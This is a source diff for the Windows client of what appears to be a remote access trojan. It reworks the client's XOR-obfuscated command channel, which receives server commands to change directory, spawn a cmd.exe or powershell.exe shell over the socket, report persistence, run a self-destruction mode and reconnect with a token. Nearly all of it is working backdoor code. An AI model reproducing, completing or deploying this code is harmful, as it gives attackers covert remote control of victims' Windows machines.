@@ -1,6 +1,5 @@
 //#define WIN32_LEAN_AND_MEAN
 
-
 #include "../inc/Connexion.h"
 #include "../inc/common.h"
 #include "../inc/Persistence.h"
@@ -28,7 +27,6 @@ int Connexion::openConnexion()
 
     sock_client = sock; //Find one alternativ
 
-
     WSAStartup(MAKEWORD(2,0), &WSAData);
     
     sock_client =  WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);  //https://stackoverflow.com/questions/4993119/redirect-io-of-process-to-windows-socket
@@ -48,24 +46,30 @@ int Connexion::openConnexion()
 
 int Connexion::main()
 {   
-    wstring command,status;
-    vector <wstring> result;
+    wstring command;
+    string status;
+
+    vector <string> result;
 
     int len_recv=0;    
+
+    BOOL status_destruction = FALSE; //Test if error in Destruction
     
-    int cmpt;
-    const int max_cmpt = TIMEOUT / MICRO_SLEEP;
-    bool status_destruction = false; //Test if error in Destruction
     while(true)
     {
         //Sleep(1000);
 
         command = recvSafe(); //Recv safe and decrypt xor
         
+        wcout << "command recv: " << command << endl;
+        wcout << "len: " << command.length() << endl;
+        
+
         if(command.find(L"is_life?") != wstring::npos)
         {
             ;
             //if find is_life then continue
+            cout << "life baby " << endl;
         }
 
         else
@@ -77,7 +81,7 @@ int Connexion::main()
             }
             else if (command.empty())
             {
-                //Connection is down.
+                //Connection is down or error.
                 ;
             }
             else if(command.substr(0,2)==L"cd")
@@ -85,20 +89,19 @@ int Connexion::main()
             //Change directory
                 if(changeDirectory(command))
                 {
-                    result.push_back(L"Error when changing folder.");
+                    result.push_back("Error when changing folder.");
                 }
                 else
                 {
-                    result.push_back(getPath());   
+                    result.push_back(ConvertWideToUtf8(getPath()));   
                 }
                 sendSafe(result);
             }
 
             else if(command.substr(0,16) == L"MOD_SPAWN_SHELL:")
             {   
-                wchar_t prog[20];
-                
                 //test if cmd.exe or powershell.exe
+                WCHAR prog[20];
 
                 if(command.substr(16, command.length()) == L"cmd.exe")
                 {
@@ -126,7 +129,7 @@ int Connexion::main()
 
                 if(command.substr(16) == L"default") //The client sends a response to the server to report whether the persistence was successfully completed. 
                 {
-                    send(sock_client ,  (char *)XOREncryption(L"\r\n").c_str() ,sizeof(L"\r\n") ,0);    
+                    send(sock_client, XOREncryption("\r\n").c_str(), 2 ,0);    
                 }
                 else
                 {
@@ -136,9 +139,7 @@ int Connexion::main()
             }
             
             else if (command.substr(0,16) == L"MOD_DESTRUCTION:") 
-            {
-
-                
+            { 
                 Destruction destruction(a_path_prog);
 
                 status_destruction = destruction.main();
@@ -147,11 +148,11 @@ int Connexion::main()
                 {
                     //If error
                     //string name_user = "MOD_HANDSHAKE_NAME_USER"  SPLIT + a_name_user;
-                    status = L"MOD_DESTRUCTION:" SPLIT + (wstring) L"True";// "[-] An error occurred while executing the destroy mode.";
+                    status = "MOD_DESTRUCTION:" SPLIT  "True";// "[-] An error occurred while executing the destroy mode.";
                 }
                 else
                 {
-                    status = L"MOD_DESTRUCTION:" SPLIT + (wstring) L"False";//"[+] The destruction mode is executed successfully.";
+                    status = "MOD_DESTRUCTION:" SPLIT  "False";//"[+] The destruction mode is executed successfully.";
                 }  
 
 
@@ -159,7 +160,7 @@ int Connexion::main()
                 {
                     //if default then send status at server. 
                     //send default persi
-                    send(sock_client, (char *)XOREncryption(status).c_str(), status.length() * sizeof(WCHAR),0); //Send the statue to the server. The server will just display the status.
+                    send(sock_client, XOREncryption(status).c_str(), status.length(), 0); //Send the statue to the server. The server will just display the status.
                 }
                 
                 else //else  substr(15,6) == "broadcast"
@@ -178,9 +179,9 @@ int Connexion::main()
                 {;} //if error not append path.
                 else
                 {
-                    result.push_back(L"\n"); //test
+                    result.push_back("\n"); //test
                     wcout << "GET PATHL: " << getPath() << endl;
-                    result.push_back(getPath());
+                    result.push_back(ConvertWideToUtf8(getPath()));
                 }
                 
                 sendSafe(result);
@@ -188,21 +189,22 @@ int Connexion::main()
         }
         command.erase(); 
         result.clear(); 
-        //i++;
     }
     return 0;
 }
 
 
 wstring Connexion::recvSafe()
-{//allows you to receive data while managing errors 
-    WCHAR buffer[BUFFER_LEN];
-    wstring result;
+{
+    //allows you to receive data while managing errors 
+    CHAR buffer[BUFFER_LEN];
+    string result;
+    int len_recv;
+
+    len_recv=recv(sock_client, buffer, sizeof(buffer), 0);
     
-    ZeroMemory(&buffer, wcslen(buffer));
-
-    int len_recv=recv(sock_client,(char *)buffer,sizeof(buffer),0);
-
+    ZeroMemory(&buffer, strlen(buffer));
+    
     if(len_recv==SOCKET_ERROR)
     {
         reConnect(); //?
@@ -210,7 +212,8 @@ wstring Connexion::recvSafe()
     }
     else
     {
-        //int stast = recv(sock, (char *)buff_wchar, sizeof(buff_wchar), 0);
+        wcout << "size of buff " << sizeof(buffer) << endl;
+        
         result.append(buffer,len_recv);
         
         if(result.empty())
@@ -220,31 +223,30 @@ wstring Connexion::recvSafe()
             return L"";
         }
     }
-    return XOREncryption(result);
+
+    return ConvertUtf8ToWide(XOREncryption(result));
 }
 
 
-void Connexion::sendSafe(vector<wstring> result_of_command)
+void Connexion::sendSafe(vector<string> result_of_command)
 { /*send data and manage errors, also allows to segment the data if it is too big.
 Once the function is finished send "\r\n" to signal to the server that the client has nothing more to send. */
     int iResult=0;
     int i=0;
     
     int size_all_result_of_command = 0;
-    wstring end = L"\r\n"; //END CONNECTION.
-    wstring request = L"";
+    string end = "\r\n"; //END CONNECTION.
+    string request = "";
 
     if(result_of_command.size() >= 1) 
     {        
         // Multiple request: 
         for(i=0;i< result_of_command.size(); i++)
         {            
-            request = result_of_command[i];
-            
-            send(sock_client, (char *)XOREncryption(request).c_str(),  request.length() * sizeof(WCHAR),0);
-
-            size_all_result_of_command += request.length();
-        
+            request = XOREncryption(result_of_command[i]);
+    
+            send(sock_client, request.c_str(),  request.length() ,0);
+            size_all_result_of_command += request.length();    
             Sleep(100);   
         }
     }
@@ -253,16 +255,15 @@ Once the function is finished send "\r\n" to signal to the server that the clien
     {
         request = result_of_command[0];
 
-        iResult = send(sock_client, (char *)XOREncryption(request).c_str(), request.length() * sizeof(WCHAR),0);
+        iResult = send(sock_client, XOREncryption(request).c_str(), request.length(), 0);
         checkSend(iResult);
         size_all_result_of_command += request.length();
     }
     
     wcout << size_all_result_of_command << endl;
     
-    iResult=send(sock_client, (char *)XOREncryption(end).c_str(),2 *sizeof(WCHAR),0); // send end communication.
+    iResult=send(sock_client, XOREncryption(end).c_str() ,2 ,0); // send end communication.
     checkSend(iResult);
-
 }
 
 
@@ -290,16 +291,16 @@ void Connexion::closeConnexion()
 
 void Connexion::reConnect()
 {   
-    wstring request;
+    string request;
     //if the client has a token then reconnects without handshaking
 
     closeConnexion();
     openConnexion();
 
-    request = (L"MOD_RECONNECT" SPLIT  + a_token);
+    request = "MOD_RECONNECT" SPLIT  + a_token;
     
     sendUltraSafe(sock_client, XOREncryption(request)); //send token
-    sendUltraSafe(sock_client, XOREncryption(L"\r\n"));
+    sendUltraSafe(sock_client, XOREncryption("\r\n"));
 }
 
 
@@ -309,7 +310,7 @@ int Connexion::getSocket()
 }
 
 
-void Connexion::setToken(wstring token)
+void Connexion::setToken(string token)
 {
     if(!token.empty())
     {
@@ -318,7 +319,7 @@ void Connexion::setToken(wstring token)
     else
     {
         //if token is empty.
-        WCHAR hex_characters[]={'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'};
+        CHAR hex_characters[]={'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'};
         int i;
 
         srand(time(0)); 
